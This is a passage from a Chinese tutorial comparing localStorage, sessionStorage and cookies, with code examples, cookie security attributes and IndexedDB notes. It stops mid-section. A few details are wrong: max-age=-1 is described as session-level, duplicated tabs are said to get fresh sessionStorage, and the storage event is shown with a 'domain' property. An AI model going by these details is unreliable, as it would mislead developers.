---
title: "第 6 篇：浏览器三大存储详解：localStorage、sessionStorage、Cookie"
slug: "3-c11c6248"
summary: "浏览器三大存储笔记，对比 localStorage、sessionStorage、Cookie 的生命周期、容量、作用域、API、请求携带、安全性和常见业务选择。"
category: "数据类型"
tags: ["浏览器存储","localStorage","sessionStorage","Cookie","前端缓存"]
status: "draft"
sortOrder: 60
cover: ""
originalId: "6a2d291f8a2b1c68f2cac340"
originalSlug: "3-c11c6248"
originalStatus: "published"
exportedAt: "2026-07-31T03:42:38.792Z"
---
# 第 6 篇：浏览器三大存储详解：localStorage、sessionStorage、Cookie
## 目录
+ [一、总览：三大存储对比](#一总览三大存储对比)
+ [二、LocalStorage（永久储物柜）](#二localstorage永久储物柜)
+ [三、SessionStorage（临时储物柜）](#三sessionstorage临时储物柜)
+ [四、Cookie（前后端小纸条）](#四cookie前后端小纸条)
+ [五、调试方法](#五调试方法)
+ [六、总结与避坑指南](#六总结与避坑指南)
+ [七、进阶补充：IndexedDB、浏览器策略与安全](#七进阶补充indexeddb浏览器策略与安全)
+ [八、附录：快速参考](#八附录快速参考)

---

## 一、总览：三大存储对比
### 1.1 核心定义
**浏览器存储机制**主要分为三类：

+ **LocalStorage**：浏览器提供的永久本地存储（Web Storage API）
+ **SessionStorage**：浏览器提供的临时会话存储（Web Storage API）
+ **Cookie**：浏览器和服务器之间的小纸条（HTTP 协议）

### 1.2 三大存储对比表
| 维度 | Cookie | LocalStorage | SessionStorage |
| --- | --- | --- | --- |
| **存储容量** | ~4KB（很小） | ~5MB（部分浏览器更大） | ~5MB |
| **数据归属** | 客户端+服务器（随请求发） | 仅客户端 | 仅客户端 |
| **数据流向** | 随每个 HTTP 请求发送到服务器 | 永远不发往服务器 | 永远不发往服务器 |
| **生命周期** | 可手动设置过期时间/会话级 | 永久（除非手动删/清缓存） | 会话级（标签页关闭即销毁） |
| **作用域** | 同域名+同路径（可配置） | 同域名+同协议+同端口 | 同标签页（即使同域名，新标签也隔离） |
| **API 友好度** | 需手动封装（原生是字符串） | 原生API极简 | 原生API极简 |
| **操作方** | 前端可读写（部分受限）+ 后端可读写 | 仅前端可读写 | 仅前端可读写 |
| **核心属性** | 过期时间、域名、路径、安全属性等 | 无复杂属性（仅键值对） | 无复杂属性（仅键值对） |


### 1.3 一句话总结
+ **Cookie**：前后端共享的小纸条，浏览器自动携带到服务器
+ **LocalStorage**：前端专属的永久储物柜，同域名下所有标签页共享
+ **SessionStorage**：前端专属的临时储物柜，仅当前标签页有效

### 1.4 选择建议
| 场景 | 推荐方案 | 原因 |
| --- | --- | --- |
| 登录态保持（sessionId/token） | Cookie（HttpOnly+Secure） | 需要前后端共享，浏览器自动携带 |
| 用户个性化设置（主题、语言） | LocalStorage | 永久保存，跨标签页共享 |
| 临时表单草稿 | SessionStorage | 关闭标签自动清空，避免垃圾数据 |
| 页面跳转临时传参 | SessionStorage | 临时数据，用完即弃 |
| 记住用户名（非敏感） | Cookie 或 LocalStorage | 根据是否需要服务器读取决定 |


---

## 二、LocalStorage（永久储物柜）
### 2.1 核心特性
+ **永久存储**：数据会一直存在浏览器中，除非手动删除（代码删除、用户清浏览器缓存、卸载浏览器）
+ **同源限制**：只有「同协议（http/https）+ 同域名 + 同端口」的页面才能访问同一份 LocalStorage 数据
    - 例：`http://localhost:3000` 不能访问 `http://localhost:8080` 的 LocalStorage
    - 例：`https://www.baidu.com` 不能访问 `http://www.baidu.com` 的数据（协议不同）
+ **字符串唯一类型**：LocalStorage 只能存**字符串**！这是新手最容易踩的坑
+ **同步操作**：所有 API 都是同步的（执行完才会继续下一步），大量/大体积数据操作会阻塞页面渲染
+ **存储上限**：约 5MB（不同浏览器略有差异，Chrome 是 5MB，Firefox 是 10MB），超出会抛异常

### 2.2 完整 API 讲解
LocalStorage 的原生 API 极其简单，一共 5 个核心方法 + 1 个属性：

#### （1）保存数据：`setItem(key, value)`
作用：往 LocalStorage 里存键值对，`key` 和 `value` 都必须是字符串（非字符串会自动转字符串）

```javascript
// 正确用法：存字符串
localStorage.setItem('username', '张三');
localStorage.setItem('age', '20'); // 数字也要转字符串

// 新手坑：直接存对象（会出问题）
localStorage.setItem('user', { name: '张三', age: 20 }); 
// 实际存储的是 "[object Object]"，读取后无法还原！
// 当你执行 localStorage.setItem('user', { name: '张三', age: 20 }) 时，
// JavaScript 会自动调用传入值的 toString() 方法，把它转换成字符串。
// 而普通对象的 toString() 方法默认返回的就是 [object Object]，
// 所以最终存入 localStorage 的内容就是这个字符串，而非对象的实际数据，
// 自然读取后也无法还原成原来的对象。
```

#### （2）读取数据：`getItem(key)`
作用：根据 `key` 读取对应的值，返回字符串（无该 key 则返回 `null`）

```javascript
// 读取正常字符串
const username = localStorage.getItem('username');
console.log(username); // 输出：张三

// 读取错误存储的对象（坑）
const user = localStorage.getItem('user');
console.log(user); // 输出：[object Object]（完全没用）

// 正确读取数字（需手动转类型）
const age = Number(localStorage.getItem('age'));
console.log(age + 1); // 输出：21（如果不转，就是 "20"+1="201"）
```

#### （3）删除单个数据：`removeItem(key)`
作用：根据 `key` 删除指定的键值对，无该 key 则静默失败（不报错）

```javascript
localStorage.removeItem('age');
console.log(localStorage.getItem('age')); // 输出：null
```

#### （4）清空所有数据：`clear()`
作用：删除当前域名下的所有 LocalStorage 数据（谨慎使用！）

```javascript
localStorage.clear();
console.log(localStorage.getItem('username')); // 输出：null
```

#### （5）获取指定索引的键名：`key(index)`
作用：根据索引（从 0 开始）获取对应的键名，常用于遍历所有数据

```javascript
// 先存点数据
localStorage.setItem('name', '李四');
localStorage.setItem('gender', '男');

// 遍历所有LocalStorage数据
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i); // 获取第i个键名
  const value = localStorage.getItem(key);
  console.log(`${key}: ${value}`);
}
// 输出：
// name: 李四
// gender: 男
```

#### （6）属性：`length`
作用：返回当前 LocalStorage 中键值对的数量

```javascript
console.log(localStorage.length); // 输出：2（对应上面的name和gender）
```

### 2.3 实战：正确存储复杂数据（对象/数组）
新手最大的坑就是直接存对象/数组，解决方法是用 `JSON.stringify()` 转字符串，读取时用 `JSON.parse()` 还原：

```javascript
// 1. 存储对象（正确姿势）
const userInfo = {
  name: '张三',
  age: 20,
  hobbies: ['篮球', '游戏']
};
localStorage.setItem('userInfo', JSON.stringify(userInfo));

// 2. 读取对象（正确姿势）
const savedUser = JSON.parse(localStorage.getItem('userInfo'));
console.log(savedUser.name); // 输出：张三
console.log(savedUser.hobbies[0]); // 输出：篮球

// 3. 存储数组（同理）
const todoList = ['吃饭', '睡觉', '打代码'];
localStorage.setItem('todoList', JSON.stringify(todoList));

// 4. 读取数组
const savedTodo = JSON.parse(localStorage.getItem('todoList'));
console.log(savedTodo[2]); // 输出：打代码

// 注意：处理解析失败（比如数据被篡改）
try {
  const data = JSON.parse(localStorage.getItem('invalidData'));
} catch (e) {
  console.error('数据解析失败：', e);
  // 兜底：清空错误数据
  localStorage.removeItem('invalidData');
}
```

### 2.4 使用场景
| 场景 | 举例 | 为什么用 LocalStorage？ |
| --- | --- | --- |
| 用户个性化设置 | 主题（深色/浅色）、语言、字体大小 | 永久保存，下次打开页面仍生效 |
| 离线数据缓存 | 文章列表、商品分类（非实时数据） | 减少接口请求，提升加载速度 |
| 用户登录态（非敏感） | 记住用户名、用户昵称（token 不建议存） | 无需每次输入，提升体验 |
| 本地草稿 | 博客编辑草稿、表单草稿 | 防止刷新/关闭页面丢失内容 |


### 2.5 进阶：跨标签页监听（storage 事件）
LocalStorage 支持跨标签页监听（SessionStorage 不支持），比如在标签1修改了 LocalStorage，标签2能收到通知：

```javascript
// 标签2：监听 LocalStorage 变化
window.addEventListener('storage', (e) => {
  console.log('LocalStorage 变化了：');
  console.log('变化的键：', e.key);
  console.log('旧值：', e.oldValue);
  console.log('新值：', e.newValue);
  console.log('所属域名：', e.domain);
});

// 标签1：修改 LocalStorage（触发事件）
localStorage.setItem('theme', 'dark');
```

**注意**：`storage` 事件**只在其他标签页触发**，当前修改的标签页不会触发。

---

## 三、SessionStorage（临时储物柜）
### 3.1 核心特性（与 LocalStorage 的关键差异）
SessionStorage 和 LocalStorage 的 API **完全一模一样**，核心区别只有「生命周期」和「作用域」：

+ **生命周期**：仅在「当前会话」有效
    - ✅ 刷新页面：数据还在
    - ✅ 页面回退/前进：数据还在
    - ❌ 关闭标签页：数据立刻销毁（哪怕重新打开同一个页面，也读不到）
    - ❌ 浏览器崩溃/重启：数据也会销毁
+ **作用域**：严格绑定「当前标签页」
    - 同一域名下，不同标签页的 SessionStorage 是完全隔离的
    - 例：在 `https://www.baidu.com` 的标签1存了 `key: 1`，标签2打开同一个网址，读 `key` 得到的是 `null`
    - 哪怕是「标签页复制」，新标签页的 SessionStorage 也是全新的，不会继承原标签页的数据
+ **其他特性**：和 LocalStorage 一样
    - 只能存字符串、5MB 容量、同步操作、同源限制

### 3.2 验证示例：作用域/生命周期
```javascript
// 步骤1：在当前标签页执行
sessionStorage.setItem('tempData', '我是临时数据');
console.log(sessionStorage.getItem('tempData')); // 输出：我是临时数据

// 步骤2：刷新当前标签页，再执行
console.log(sessionStorage.getItem('tempData')); // 输出：我是临时数据（还在）

// 步骤3：新开标签页，打开同一个页面，执行
console.log(sessionStorage.getItem('tempData')); // 输出：null（隔离）

// 步骤4：关闭当前标签页，重新打开页面，执行
console.log(sessionStorage.getItem('tempData')); // 输出：null（已销毁）
```

### 3.3 API 使用（与 LocalStorage 完全一致）
SessionStorage 的 API 和 LocalStorage 完全一样，只是把 `localStorage` 换成 `sessionStorage`：

```javascript
// 存数据
sessionStorage.setItem('username', '张三');
sessionStorage.setItem('age', '20');

// 读数据
const username = sessionStorage.getItem('username');
const age = Number(sessionStorage.getItem('age'));

// 删数据
sessionStorage.removeItem('age');

// 清空所有
sessionStorage.clear();

// 遍历数据
for (let i = 0; i < sessionStorage.length; i++) {
  const key = sessionStorage.key(i);
  const value = sessionStorage.getItem(key);
  console.log(`${key}: ${value}`);
}
```

### 3.4 存储复杂数据（对象/数组）
和 LocalStorage 一样，必须用 `JSON.stringify()` 和 `JSON.parse()`：

```javascript
// 存储对象（正确姿势）
const userInfo = {
  name: '张三',
  age: 20,
  hobbies: ['篮球', '游戏'],
  isVip: false
};
sessionStorage.setItem('userInfo', JSON.stringify(userInfo));

// 读取对象（正确姿势）
const savedUser = JSON.parse(sessionStorage.getItem('userInfo'));
console.log(savedUser.name); // 输出："张三"

// 防坑：处理解析失败
try {
  const badData = JSON.parse(sessionStorage.getItem('invalidData'));
} catch (e) {
  console.error('解析失败：', e);
  sessionStorage.removeItem('invalidData');
}
```

### 3.5 使用场景
| 场景 | 举例 | 为什么用 SessionStorage？ |
| --- | --- | --- |
| 临时表单数据 | 长表单（比如注册页）的分步填写数据 | 仅当前会话有效，关闭标签就清，避免垃圾数据 |
| 页面跳转临时数据 | 从页面A跳转到页面B，传递临时参数 | 比 URL 参数更安全，且容量更大 |
| 临时状态存储 | 页面的临时筛选条件、滚动位置 | 仅当前标签有效，不影响其他标签 |
| 敏感临时数据 | 临时的验证码、一次性操作凭证 | 关闭标签自动销毁，降低泄露风险 |


### 3.6 实战场景代码示例
#### 场景1：临时表单草稿（最常用）
```javascript
// 监听表单输入，实时存到sessionStorage
const form = document.querySelector('#registerForm');
form.addEventListener('input', (e) => {
  const formData = {
    username: form.username.value,
    phone: form.phone.value,
    email: form.email.value
  };
  sessionStorage.setItem('registerFormDraft', JSON.stringify(formData));
});

// 页面加载时，恢复表单数据
window.onload = () => {
  const draft = JSON.parse(sessionStorage.getItem('registerFormDraft'));
  if (draft) {
    form.username.value = draft.username || '';
    form.phone.value = draft.phone || '';
    form.email.value = draft.email || '';
  }
};
```

#### 场景2：页面跳转临时传参
```javascript
// 页面A：跳转前存参数
function goToPageB() {
  const filterParams = {
    keyword: '前端',
    page: 1,
    size: 10
  };
  sessionStorage.setItem('tempFilter', JSON.stringify(filterParams));
  window.location.href = 'pageB.html';
}

// 页面B：加载时读参数
window.onload = () => {
  const params = JSON.parse(sessionStorage.getItem('tempFilter'));
  if (params) {
    console.log('接收的参数：', params);
    // 用完就删，避免残留
    sessionStorage.removeItem('tempFilter');
  }
};
```

---

## 四、Cookie（前后端小纸条）
### 4.1 核心定义
Cookie 是「浏览器和服务器之间的小纸条」—— 服务器通过响应头给浏览器发一张「小纸条（Cookie）」，浏览器会把这张纸条存起来；之后每次向该服务器发请求时，都会自动带上这张纸条，让服务器能「认出你」。

### 4.2 核心难点：属性配置
Cookie 之所以难，核心是它有**多个控制行为的属性**，每个属性都影响 Cookie 的「有效期」「作用域」「安全性」。

#### 完整 Cookie 格式示例
```plain
Set-Cookie: username=张三; expires=Thu, 31 Dec 2025 23:59:59 GMT; domain=.example.com; path=/; secure; HttpOnly; SameSite=Lax
```

每个属性用分号分隔，我们逐个讲解：

#### （1）基础键值对（必选）
+ **格式**：`key=value`
+ **说明**：Cookie 的核心数据，比如 `username=张三`，**只能存字符串**，**且需要编码**（比如中文/特殊字符用 `encodeURIComponent`）（键值对 + 可选属性，属性间用 ; 分隔），**<font style="color:rgb(0, 0, 0) !important;">不能一次写多个键值对</font>**<font style="color:rgba(0, 0, 0, 0.85);">，必须分多次赋值（一次写多个键值对，仅第一个生效）</font>
+ **坑点**：不能包含空格、分号、逗号等特殊字符，否则会截断，必须编码！

#### （2）有效期属性（⭐重点）
控制 Cookie 什么时候失效，分两种：

`expires`**：绝对过期时间**

+ 格式：`expires=GMT格式的时间字符串`（比如 `Thu, 31 Dec 2025 23:59:59 GMT`）
+ 说明：指定 Cookie 过期的「具体时间」，超过这个时间，浏览器自动删除该 Cookie
+ 坑点：
    - 时间必须是 **GMT/UTC 格式**（不是本地时间），否则失效
    - 如果不设置 `expires`/`max-age`，Cookie 是「会话级 Cookie」—— 关闭浏览器就失效（注意：是关闭浏览器，不是关闭标签页！和 SessionStorage 不同）

`max-age`**：相对过期时间（推荐用）**

+ 格式：`max-age=秒数`（比如 `max-age=86400` 表示 1 天，`max-age=0` 表示立即删除，`max-age=-1` 表示会话级）
+ 说明：从设置 Cookie 开始，过多少秒后失效，比 `expires` 更直观（不用算具体时间）
+ 对比：
    - `expires`：「到某天某时失效」（绝对时间）
    - `max-age`：「从现在开始活多少秒」（相对时间）

#### （3）作用域属性（⭐重点）
Cookie 的作用域由 `domain`（域名）和 `path`（路径）共同决定：

`domain`**：域名作用域**

+ 格式：`domain=example.com` 或 `domain=.example.com`（带点）
+ 说明：控制「哪些域名能访问该 Cookie」
    - 不设置 `domain`：默认是「当前域名」（比如在 `www.example.com` 设的 Cookie，只有 `www.example.com` 能访问，`blog.example.com` 访问不到）
    - 设置 `domain=.example.com`（带点）：所有子域名都能访问（`www.example.com`、`blog.example.com`、`shop.example.com` 都能读到）
    - 限制：`domain` 只能设置为「当前域名或其父域名」，比如 `www.example.com` 不能设置 `domain=baidu.com`（浏览器会拒绝，安全限制）

`path`**：路径作用域**

+ 格式：`path=/` 或 `path=/blog`
+ 说明：在域名范围内，控制「哪些路径能访问该 Cookie」
    - 设置 `path=/`：该域名下所有路径都能访问（比如 `/`、`/blog`、`/shop`）
    - 设置 `path=/blog`：只有 `/blog`、`/blog/detail` 等子路径能访问，`/shop` 路径访问不到
    - 不设置 `path`：默认是「当前页面的路径」（比如在 `www.example.com/blog` 设的 Cookie，默认 `path=/blog`）

✅ **总结作用域**：只有「域名匹配 domain + 路径匹配 path」的页面，才能读写该 Cookie。

#### （4）安全属性（⭐重点，防攻击必备）
`secure`**：仅 HTTPS 传输**

+ 格式：直接写 `secure`（无值）
+ 说明：设置了 `secure` 的 Cookie，**只有在 HTTPS 协议下才会发送到服务器**，HTTP 协议下不会发送
+ 作用：防止 Cookie 在 HTTP 传输中被窃听/篡改（比如公共 WiFi 下的中间人攻击）

`HttpOnly`**：禁止前端 JS 访问（****⭐****最关键）**

+ 格式：直接写 `HttpOnly`（无值）
+ 说明：设置了 `HttpOnly` 的 Cookie，**前端无法通过 JS 读写**（比如 `document.cookie` 读不到、改不了），只能由浏览器自动携带到服务器
+ 作用：防止 XSS 攻击（攻击者注入恶意 JS 偷取 Cookie）—— 比如登录态的 `token`/`sessionId` 必须设 `HttpOnly`！
+ 小白注意：你在控制台用 `document.cookie` 看不到 `HttpOnly` 的 Cookie，但浏览器会自动带它发请求

`SameSite`**：防止 CSRF 攻击**

+ 格式：`SameSite=Strict`/`Lax`/`None`
+ 说明：控制 Cookie 是否在「跨站请求」中发送
    - `SameSite=Strict`（严格）：仅在「同站请求」中发送 Cookie，跨站请求绝不发送——最安全，但体验差（比如第三方登录会失效）
    - `SameSite=Lax`（宽松，默认值）：大部分跨站请求不发送，但「安全的跨站请求」（比如 GET 方法的链接跳转）会发送——兼顾安全和体验
    - `SameSite=None`：所有跨站请求都发送，但**必须同时设置 **`secure`** 属性**（否则浏览器拒绝）—— 适合第三方嵌入（比如广告、统计）

### 4.3 Cookie 的读写操作（前端视角）
Cookie 的原生 API（`document.cookie`）极其反人类——既不是对象，也不是数组，而是一个字符串（键值对 + 可选属性，属性间用 ; 分隔），**<font style="color:rgb(0, 0, 0) !important;">不能一次写多个键值对</font>**<font style="color:rgba(0, 0, 0, 0.85);">，必须分多次赋值（一次写多个键值对，仅第一个生效），</font>每次赋值是「添加」而非「覆盖」，新手直接用必踩坑！

#### 原生 API 示例（知道坑在哪）
```javascript
// 1. 设置 Cookie（添加，不是覆盖！）
document.cookie = "username=张三; max-age=86400; path=/"; // 添加一个 Cookie
document.cookie = "age=20; max-age=86400; path=/"; // 再添加一个，不是覆盖

// 2. 读取 Cookie（返回所有 Cookie 的字符串，需手动解析）
console.log(document.cookie); // 输出："username=张三; age=20"

// 3. 修改 Cookie（同名+同domain+同path 才会覆盖）
document.cookie = "username=李四; max-age=86400; path=/"; // 覆盖上面的 username

// 4. 删除 Cookie（设置 max-age=0 或 expires 为过去时间）
document.cookie = "username=; max-age=0; path=/";
```

✅ **核心坑**：修改/删除 Cookie 时，必须保证 `key`、`domain`、`path` 和原 Cookie 完全一致，否则会新建一个 Cookie，而不是覆盖/删除！

#### 封装 Cookie 操作函数（推荐使用）
```javascript
/**
 * Cookie 操作工具类（小白友好版）
 */
const CookieUtil = {
  /**
   * 设置 Cookie
   * @param {string} key - 键名
   * @param {string} value - 键值（自动编码）
   * @param {object} options - 可选配置
   * @param {number} options.maxAge - 过期时间（秒），优先级高于 expires
   * @param {Date} options.expires - 过期时间（Date 对象）
   * @param {string} options.domain - 域名
   * @param {string} options.path - 路径，默认 /
   * @param {boolean} options.secure - 是否仅 HTTPS 传输
   */
  set: function (key, value, options = {}) {
    // 1. 编码键值（防止特殊字符/中文截断）
    let cookieStr = `${encodeURIComponent(key)}=${encodeURIComponent(value)}`;

    // 2. 处理过期时间
    if (options.maxAge) {
      cookieStr += `; max-age=${options.maxAge}`;
    } else if (options.expires) {
      cookieStr += `; expires=${options.expires.toUTCString()}`;
    }

    // 3. 处理域名
    if (options.domain) {
      cookieStr += `; domain=${options.domain}`;
    }

    // 4. 处理路径（默认 /）
    cookieStr += `; path=${options.path || '/'}`;

    // 5. 处理 secure
    if (options.secure) {
      cookieStr += `; secure`;
    }

    // 6. 设置 Cookie
    document.cookie = cookieStr;
  },

  /**
   * 获取 Cookie
   * @param {string} key - 键名
   * @returns {string|null} 解码后的值，不存在返回 null
   */
  get: function (key) {
    const cookies = document.cookie.split('; ');
    for (const cookie of cookies) {
      const [cookieKey, cookieValue] = cookie.split('=');
      const decodedKey = decodeURIComponent(cookieKey);
      if (decodedKey === key) {
        return decodeURIComponent(cookieValue);
      }
    }
    return null;
  },

  /**
   * 删除 Cookie（本质是设置过期时间为0）
   * @param {string} key - 键名
   * @param {object} options - 必须和设置时的 domain/path 一致！
   */
  remove: function (key, options = {}) {
    this.set(key, '', {
      ...options,
      maxAge: 0 // 设置立即过期
    });
  },

  /**
   * 获取所有 Cookie（返回对象）
   * @returns {object} 所有 Cookie 的键值对
   */
  getAll: function () {
    const cookieObj = {};
    const cookies = document.cookie.split('; ');
    for (const cookie of cookies) {
      const [cookieKey, cookieValue] = cookie.split('=');
      const decodedKey = decodeURIComponent(cookieKey);
      const decodedValue = decodeURIComponent(cookieValue);
      cookieObj[decodedKey] = decodedValue;
    }
    return cookieObj;
  }
};

// ==================== 用法示例 ====================
// 1. 设置普通 Cookie（1 天过期，全站可访问）
CookieUtil.set('username', '张三', {
  maxAge: 86400, // 1 天 = 24*60*60 秒
  path: '/'
});

// 2. 设置子域名共享的 Cookie
CookieUtil.set('theme', 'dark', {
  maxAge: 604800, // 7 天
  domain: '.example.com', // 所有子域名都能访问
  path: '/'
});

// 3. 读取 Cookie
console.log(CookieUtil.get('username')); // 输出：张三

// 4. 读取所有 Cookie
console.log(CookieUtil.getAll()); // 输出：{username: "张三", theme: "dark"}

// 5. 删除 Cookie（必须和设置时的 domain/path 一致！）
CookieUtil.remove('username', {
  path: '/'
});
```

### 4.4 Cookie 与服务器的交互
Cookie 的核心价值是「前后端共享数据」，我们用「登录态保持」这个最经典的场景，讲清楚 Cookie 如何在前后端之间流转。

#### 流程说明
1. 用户访问登录页，输入账号密码，点击登录
2. 前端发送登录请求到后端
3. 后端验证账号密码，生成 sessionId
4. 后端设置 Cookie：`Set-Cookie: sessionId=123456; HttpOnly; Secure; Max-Age=86400; Path=/; Domain=.example.com`
5. 浏览器接收响应，保存该 Cookie
6. 用户后续访问其他页面（比如个人中心）
7. 浏览器自动携带 Cookie：`Cookie: sessionId=123456`
8. 后端读取 Cookie 中的 sessionId，验证登录态，返回用户数据

#### 后端设置 Cookie 示例
**Node.js（Express）**

```javascript
const express = require('express');
const app = express();

// 登录接口
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  // 验证账号密码（省略）
  const sessionId = '生成的唯一sessionId';
  
  // 设置 Cookie（核心：res.setHeader 加 Set-Cookie）
  res.setHeader('Set-Cookie', [
    `sessionId=${sessionId}; HttpOnly; Secure; Max-Age=86400; Path=/; Domain=.example.com`,
    `username=${username}; Max-Age=86400; Path=/; Domain=.example.com`
  ]);
  
  res.send({ code: 200, msg: '登录成功' });
});

app.listen(3000);
```

**Java（Spring Boot）**

```java
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    // 验证账号密码（省略）
    String sessionId = "生成的唯一sessionId";
    
    // 设置 Cookie
    Cookie sessionCookie = new Cookie("sessionId", sessionId);
    sessionCookie.setHttpOnly(true); // 禁止前端访问
    sessionCookie.setSecure(true); // 仅 HTTPS
    sessionCookie.setMaxAge(86400); // 1 天
    sessionCookie.setPath("/");
    sessionCookie.setDomain(".example.com");
    
    // 响应中添加 Cookie
    HttpHeaders headers = new HttpHeaders();
    headers.add(HttpHeaders.SET_COOKIE, WebUtils.toCookieHeader(sessionCookie));
    
    return ResponseEntity.ok().headers(headers).body("登录成功");
}
```

### 4.5 使用场景
| 场景 | 举例 | 为什么用 Cookie？ |
| --- | --- | --- |
| 登录态保持 | sessionId/token（必须设 HttpOnly） | 前后端共享，浏览器自动携带 |
| 记住用户名 | 登录页的「记住我」功能 | 长期存储，下次登录自动填充 |
| 用户偏好设置 | 语言、时区（非敏感） | 跨页面/跨域名共享（比如子域名） |
| 防 CSRF 攻击 | CSRF Token 存在 Cookie（配合 SameSite） | 验证请求合法性 |
| 流量统计/用户跟踪 | 唯一标识用户的 Cookie（第三方 Cookie） | 跨页面跟踪用户行为 |


---

## 五、调试方法
### 5.1 LocalStorage 和 SessionStorage 调试
以 Chrome 为例：

1. 打开任意页面，按 **F12** 或右键「检查」
2. 切换到「**Application（应用）**」标签
3. 在左侧菜单找到「**Storage**」：
    - **LocalStorage**：点击后能看到当前域名下的所有键值对，可直接编辑/删除
    - **SessionStorage**：同理，仅显示当前标签页的临时数据
4. 测试：你可以在控制台执行 `localStorage.setItem('test', '123')`，然后在 Application 里刷新，就能看到这条数据

### 5.2 Cookie 调试
以 Chrome 为例，调试 Cookie 分两步：

#### （1）查看/编辑 Cookie
+ 按 **F12** → 「**Application（应用）**」→ 「**Cookies**」→ 选择域名，就能看到所有 Cookie（包括 HttpOnly 的，只是标了「HttpOnly」，前端改不了）
+ 可直接编辑值、删除 Cookie，也能右键「Add cookie」新增

#### （2）查看请求/响应头中的 Cookie
+ 按 **F12** → 「**Network（网络）**」→ 选任意请求 → 「**Headers（标头）**」：
    - 「Request Headers」里的 `Cookie`：浏览器发给服务器的 Cookie
    - 「Response Headers」里的 `Set-Cookie`：服务器发给浏览器的 Cookie

---

## 六、总结与避坑指南
### 6.1 三大存储核心总结
| 存储类型 | 核心特点 | 最佳场景 |
| --- | --- | --- |
| **LocalStorage** | 永久存储、同域名共享、5MB容量 | 用户设置、离线缓存、本地草稿 |
| **SessionStorage** | 临时存储、标签页隔离、5MB容量 | 临时表单、页面传参、临时筛选 |
| **Cookie** | 前后端共享、4KB容量、自动携带 | 登录态、记住用户名、跨域共享 |


### 6.2 通用避坑指南
#### 1. 数据类型处理
+ ❌ **错误**：直接存对象/数组

```javascript
localStorage.setItem('user', { name: '张三' }); // 存的是 "[object Object]"
```

+ ✅ **正确**：必须序列化

```javascript
localStorage.setItem('user', JSON.stringify({ name: '张三' }));
const user = JSON.parse(localStorage.getItem('user'));
```

#### 2. 敏感数据存储
+ ❌ **绝对不要存**：密码、银行卡号、完整 token（未加密）
+ ✅ **可以存**：
    - LocalStorage/SessionStorage：非敏感的用户设置、草稿
    - Cookie：sessionId/token（必须设 HttpOnly+Secure+SameSite）

#### 3. 容量限制
+ Cookie：~4KB（很小，只能存标识）
+ LocalStorage/SessionStorage：~5MB（足够存一般数据）
+ 大量数据建议用 IndexedDB（进阶）

#### 4. 同步操作阻塞
+ LocalStorage/SessionStorage 都是同步操作，大量数据会阻塞页面
+ 建议：拆分数据、异步处理、或用 IndexedDB

#### 5. 数据可能被清空
+ 用户可能清除浏览器缓存
+ 不能把浏览器存储当作「永久数据库」
+ 重要数据必须同步到服务器

### 6.3 各存储类型专属避坑
#### LocalStorage
1. **不要存敏感数据**：明文存储，任何人都能看到
2. **注意数据类型转换**：读取后要手动转类型（Number/Boolean）
3. **避免大量/大体积数据**：会阻塞页面渲染
4. **跨域无法访问**：同源策略限制

#### SessionStorage
1. **不要误以为跨标签页共享**：每个标签页完全隔离
2. **不要存长期数据**：关闭标签页就没了
3. **不要依赖它存关键数据**：用户可能误关标签页

#### Cookie
1. **修改/删除必须匹配 domain/path**：否则会新建而不是覆盖
2. **中文/特殊字符必须编码**：用 `encodeURIComponent` 编码
3. **HttpOnly Cookie 前端无法操作**：不要试图用 JS 读写
4. **Cookie 容量只有 4KB**：不能存大量数据
5. **第三方 Cookie 可能被拦截**：现代浏览器默认拦截
6. **会话级 Cookie 关闭浏览器才失效**：和 SessionStorage 不同（SessionStorage 关标签页就没）

### 6.4 安全最佳实践
| 场景 | 推荐配置 |
| --- | --- |
| 登录态（sessionId/token） | Cookie + HttpOnly + Secure + SameSite=Lax |
| 用户设置（非敏感） | LocalStorage（明文即可） |
| 临时验证码 | SessionStorage（关闭标签自动销毁） |
| 跨域共享数据 | Cookie + domain + SameSite=None + Secure |


### 6.5 快速选择指南
```plain
需要前后端共享？
├─ 是 → Cookie
│   ├─ 敏感数据？ → Cookie + HttpOnly + Secure
│   └─ 非敏感数据 → Cookie（普通配置）
│
└─ 否 → 仅前端使用
    ├─ 需要永久保存？
    │   ├─ 是 → LocalStorage
    │   └─ 否 → SessionStorage
    │
    └─ 需要跨标签页共享？
        ├─ 是 → LocalStorage
        └─ 否 → SessionStorage
```

---

## 七、进阶补充：IndexedDB、浏览器策略与安全
### 7.1 IndexedDB：大体量本地数据库的选择
这一节只做“**概念级速记**”，不深挖 API，目的是：**知道什么时候该从 LocalStorage 升级到 IndexedDB**。

+ **IndexedDB 是什么？**
    - 浏览器内置的**键值对本地数据库**，支持**事务、索引、游标、筛选查询**等，适合存**大量结构化数据**。
    - API 是**异步的**（基于事件/Promise），不会像 LocalStorage 一样阻塞主线程。
+ **什么时候不要再用 LocalStorage，而是用 IndexedDB？**

| 场景 | 建议 |
| --- | --- |
| 数据总量可能上 MB～百 MB（文章缓存、聊天记录、离线大列表） | 用 IndexedDB |
| 需要按多个字段筛选/排序（比如按时间、分类、关键字搜索） | 用 IndexedDB（支持索引） |
| 只是一点配置、小对象（主题、语言、少量缓存） | 用 LocalStorage |
| 只在当前会话用到的临时数据 | 用 SessionStorage |


+ **IndexedDB vs LocalStorage 对比速记**

| 维度 | LocalStorage | IndexedDB |
| --- | --- | --- |
| 容量 | ~5MB | 远大于 5MB（视浏览器和磁盘而定） |
| API 类型 | 同步 | 异步 |
| 数据结构 | 简单 key-value（自己序列化） | 数据库 → 对象仓库 → 索引 |
| 查询能力 | 只能按 key 取值 | 支持按索引范围查询、游标遍历 |
| 适用场景 | 配置、小对象、少量缓存 | 大量数据、离线应用、本地搜索 |


> 记忆一句话：**“只要你开始想把几万条数据塞进 LocalStorage，就应该考虑 IndexedDB 了。”**
>

### 7.2 浏览器配额与清理策略（大致认知够用）
不同浏览器对本地存储（LocalStorage / SessionStorage / IndexedDB）的**容量和清理策略**略有不同，不需要记具体数字，只要有下面几个认知即可：

+ **大致容量认知**
    - LocalStorage / SessionStorage：单源（origin）大约 5MB 左右；
    - IndexedDB：通常远大于 5MB，一般和“磁盘空间”与“站点使用情况”挂钩；
    - 具体数值各家浏览器、各版本都不一样，不要写死在代码逻辑里。
+ **可能被系统自动清理的情况**
    - 用户主动在浏览器设置里点了“清除站点数据/缓存”；
    - 浏览器存储配额紧张，需要回收空间时，会先清理**长期未访问的站点数据**；
    - 部分移动端浏览器在设备空间不足时，会比较激进地回收离线存储。
+ **对前端的实战建议**
